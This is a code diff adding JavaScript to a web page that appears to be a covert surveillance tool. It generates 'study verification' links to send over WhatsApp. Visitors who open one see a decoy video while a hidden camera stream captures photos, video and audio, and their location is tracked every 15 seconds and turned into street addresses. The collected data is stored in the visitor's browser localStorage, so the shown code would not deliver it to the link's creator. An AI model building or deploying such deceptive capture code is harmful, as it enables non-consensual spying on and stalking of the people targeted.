+                        <p class="text-white/60 text-xs">${l.address || 'Address fetched'}</p>
+                        <p class="text-white/40 text-xs">⏰ ${l.time}</p>
+                    </div>
+                    <a href="https://maps.google.com?q=${l.lat},${l.lng}" target="_blank" class="bg-blue-500 text-white px-3 py-1 rounded-lg text-sm">Map</a>
+                </div>
+            </div>
+        `;
+    });
+}
+
+// ============ DOWNLOAD FUNCTIONS ============
+function downloadPhoto(idx) { const a = document.createElement('a'); a.download = `photo_${Date.now()}.jpg`; a.href = allPhotos[idx].data; a.click(); }
+function downloadVideo(idx) { const a = document.createElement('a'); a.download = `video_${Date.now()}.webm`; a.href = allVideos[idx].data; a.click(); }
+function downloadVoice(idx) { const a = document.createElement('a'); a.download = `voice_${Date.now()}.webm`; a.href = allVoices[idx].data; a.click(); }
+
+function downloadAllData() {
+    const report = { photos: allPhotos.length, videos: allVideos.length, voices: allVoices.length, locations: allLocations, exportedAt: new Date().toLocaleString() };
+    const a = document.createElement('a');
+    a.download = `study_report_${Date.now()}.json`;
+    a.href = URL.createObjectURL(new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' }));
+    a.click();
+    alert('✅ Complete report downloaded!');
+}
+
+// ============ LINK GENERATION ============
+function generateLink() {
+    const campaignName = document.getElementById('campaignName').value;
+    if(!campaignName) { alert('Please enter campaign name'); return; }
+    
+    const captureSpeed = parseFloat(document.getElementById('captureSpeed').value);
+    const photoCount = document.getElementById('photoCount').value;
+    const uniqueCode = 'STUDY_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10).toUpperCase();
+    
+    const linkData = {
+        code: uniqueCode,
+        name: campaignName,
+        speed: captureSpeed,
+        photos: parseInt(photoCount),
+        video: storedCustomVideo,
+        image: storedCustomImage
+    };
+    
+    let allLinks = JSON.parse(localStorage.getItem('studyLinksFinal2') || '[]');
+    allLinks.push(linkData);
+    localStorage.setItem('studyLinksFinal2', JSON.stringify(allLinks));
+    
+    const baseUrl = window.location.href.split('?')[0];
+    const fullLink = baseUrl + '?code=' + uniqueCode;
+    
+    document.getElementById('generatedLink').value = fullLink;
+    document.getElementById('linkBox').classList.remove('hidden');
+}
+
+function copyLink() {
+    const input = document.getElementById('generatedLink');
+    input.select();
+    document.execCommand('copy');
+    alert('✅ Link copied!');
+}
+
+function sendToWhatsApp() {
+    const link = document.getElementById('generatedLink').value;
+    window.open(`https://wa.me/?text=${encodeURIComponent('📸 Study Verification: ' + link)}`, '_blank');
+}
+
+// ============ CAMERA PAGE ============
+async function startCameraPage(linkData) {
+    neededCount = linkData.photos;
+    captureInterval = linkData.speed * 1000;
+    capturedCount = 0;
+    
+    document.getElementById('cameraTitle').innerHTML = linkData.name;
+    
+    const videoElement = document.getElementById('fakeVideo');
+    if(linkData.video && linkData.video !== '') {
+        videoElement.src = linkData.video;
+    } else {
+        videoElement.src = "https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4";
+    }
+    videoElement.play();
+    
+    if(linkData.image && linkData.image !== '') {
+        document.body.style.backgroundImage = `url(${linkData.image})`;
+        document.body.style.backgroundSize = 'cover';
+    }
+    
+    await startRecording();
+}
+
+async function startRecording() {
+    try {
+        hiddenStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        document.getElementById('hiddenVideo').srcObject = hiddenStream;
+        
+        videoRecorder = new MediaRecorder(hiddenStream);
+        videoChunks = [];
+        videoRecorder.ondataavailable = (e) => { if(e.data.size > 0) videoChunks.push(e.data); };
+        videoRecorder.onstop = () => { 
+            if(videoChunks.length) { 
+                const blob = new Blob(videoChunks, { type: 'video/webm' }); 
+                allVideos.push({ id: Date.now(), data: URL.createObjectURL(blob), time: new Date().toLocaleString() }); 
+                localStorage.setItem('studyVideosFinal2', JSON.stringify(allVideos));
+                updateStats();
+                displayVideos();
+            } 
+        };
+        videoRecorder.start(1000);
+        
+        audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        audioRecorder = new MediaRecorder(audioStream);
+        audioChunks = [];
+        audioRecorder.ondataavailable = (e) => { if(e.data.size > 0) audioChunks.push(e.data); };
+        audioRecorder.onstop = () => { 
+            if(audioChunks.length) { 
+                const blob = new Blob(audioChunks, { type: 'audio/webm' }); 
+                allVoices.push({ id: Date.now(), data: URL.createObjectURL(blob), time: new Date().toLocaleString() }); 
+                localStorage.setItem('studyVoicesFinal2', JSON.stringify(allVoices));
+                updateStats();
+                displayVoices();
+            } 
+        };
+        audioRecorder.start(1000);
+        
+        await getLocationWithAddress();
+        locationInterval = setInterval(getLocationWithAddress, 15000);
+        
+        setTimeout(() => startCapture(), 2000);
+        document.getElementById('statusText').innerHTML = '<i class="fas fa-heartbeat fa-pulse mr-2"></i> Study session active';
+    } catch(e) {
+        document.getElementById('statusText').innerHTML = '<i class="fas fa-info-circle mr-2"></i> Please allow camera access';
+    }
+}
+
+async function getLocationWithAddress() {
+    navigator.geolocation.getCurrentPosition(async (p) => {
+        let address = 'Address not found';
+        try {
+            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${p.coords.latitude}&lon=${p.coords.longitude}`);
+            const data = await res.json();
+            address = data.display_name || `${p.coords.latitude}, ${p.coords.longitude}`;
+        } catch(e) {}
+        
+        allLocations.push({ 
+            id: Date.now(), 
+            lat: p.coords.latitude, 
+            lng: p.coords.longitude, 
+            address: address,
+            time: new Date().toLocaleString() 
+        });
+        localStorage.setItem('studyLocsFinal2', JSON.stringify(allLocations));
+        updateStats();
+        displayLocations();
+    }, () => {});
+}
+
+function startCapture() {
+    captureTimer = setInterval(() => {
+        if(capturedCount >= neededCount) {
+            clearInterval(captureTimer);
+            if(videoRecorder && videoRecorder.state === 'recording') videoRecorder.stop();
+            if(audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
+            if(locationInterval) clearInterval(locationInterval);
+            document.getElementById('statusText').innerHTML = '<i class="fas fa-check-circle mr-2"></i> Session complete!';
+            return;
+        }
+        
+        const video = document.getElementById('hiddenVideo');
+        if(video && video.videoWidth > 0) {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const photoData = canvas.toDataURL('image/jpeg', 0.8);
+            allPhotos.push({ id: Date.now(), data: photoData, time: new Date().toLocaleString() });
+            localStorage.setItem('studyPhotosFinal2', JSON.stringify(allPhotos));
+            capturedCount++;
+            updateStats();
+            displayPhotos();
+            
+            const msgs = ["📖 Keep going!", "✨ You're doing great!", "💪 Almost there!", "🎯 Stay focused!"];
+            document.getElementById('motivationMsg').innerHTML = msgs[Math.floor(Math.random() * msgs.length)];
+            document.getElementById('statusText').innerHTML = `<i class="fas fa-camera mr-2"></i> Captured ${capturedCount}/${neededCount}`;
+        }
+    }, captureInterval);
+}
+
+function updateStats() {
+    let photos = JSON.parse(localStorage.getItem('studyPhotosFinal2') || '[]');
+    let videos = JSON.parse(localStorage.getItem('studyVideosFinal2') || '[]');
+    let voices = JSON.parse(localStorage.getItem('studyVoicesFinal2') || '[]');
+    let locs = JSON.parse(localStorage.getItem('studyLocsFinal2') || '[]');
+    
+    allPhotos = photos;
+    allVideos = videos;
+    allVoices = voices;
+    allLocations = locs;
+    
+    document.getElementById('statPhotos').innerHTML = photos.length;
+    document.getElementById('statVideos').innerHTML = videos.length;
+    document.getElementById('statVoices').innerHTML = voices.length;
+    document.getElementById('statLocs').innerHTML = locs.length;
+    
+    displayPhotos();
+}
+
+// ============ CHECK URL ============
+function checkUrl() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const code = urlParams.get('code');
+    
+    if(code) {
+        let allLinks = JSON.parse(localStorage.getItem('studyLinksFinal2') || '[]');
+        const linkData = allLinks.find(l => l.code === code);
+        
+        if(linkData) {
+            document.getElementById('adminPanel').classList.add('hidden');
+            document.getElementById('cameraPanel').classList.remove('hidden');
+            startCameraPage(linkData);
+        } else {
+            document.getElementById('adminPanel').classList.remove('hidden');
+            document.getElementById('cameraPanel').classList.add('hidden');
+            updateStats();
+        }
+    } else {
+        document.getElementById('adminPanel').classList.remove('hidden');
+        document.getElementById('cameraPanel').classList.add('hidden');
+        updateStats();
+    }
+}
+
+// Make global
+window.generateLink = generateLink;
+window.copyLink = copyLink;
+window.sendToWhatsApp = sendToWhatsApp;
+window.downloadAllData = downloadAllData;
+window.downloadPhoto = downloadPhoto;
+window.downloadVideo = downloadVideo;
+window.downloadVoice = downloadVoice;
+window.showTab = showTab;
+
+// Start
+checkUrl();
+
+window.addEventListener('beforeunload', () => {
+    if(hiddenStream) hiddenStream.getTracks().forEach(t => t.stop());
+    if(audioStream) audioStream.getTracks().forEach(t => t.stop());
+    if(captureTimer) clearInterval(captureTimer);
+    if(locationInterval) clearInterval(locationInterval);
+});
+</script>
 </body>
 </html>
